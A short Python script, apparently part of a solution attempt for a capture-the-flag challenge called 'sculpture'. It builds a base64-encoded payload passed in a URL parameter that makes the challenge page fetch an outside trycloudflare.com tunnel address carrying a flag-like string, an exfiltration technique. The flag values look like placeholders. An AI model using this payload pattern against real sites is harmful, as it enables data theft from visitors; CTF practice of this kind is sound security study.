import requests, base64
flag = "amateurs{How_do_I_get_localStorage_from_skulpt?}"
code = """
from urllib.request import urlopen
resp = urlopen("https://most-wet-soul-someone.trycloudflare.com/{flag}")
print(resp.read())
""".format(flag="how do I get localStorage from sculpture")
url = f"https://amateurs-ctf-2024-sculpture-challenge.pages.dev/?code={base64.b64encode(code.encode()).decode()}"
print(url)